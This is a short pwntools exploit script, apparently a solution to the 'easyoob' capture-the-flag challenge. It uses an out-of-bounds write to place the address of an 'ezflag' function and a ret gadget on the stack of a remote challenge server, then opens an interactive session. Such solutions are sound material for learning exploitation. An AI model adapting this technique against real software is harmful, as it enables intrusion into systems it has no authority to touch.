from pwn import *

# --- setup ---
elf = context.binary = ELF('./easyoob')
rop = ROP(elf)
# p = process()
p = remote('challs.nusgreyhats.org', 10524)

# --- exploit ---
p.sendline(bytes(f'2 22 {elf.sym.ezflag} 0', 'utf-8'))
p.sendline(bytes(f'2 21 {rop.ret.address} 0', 'utf-8'))
p.sendline(b'3')
p.interactive()
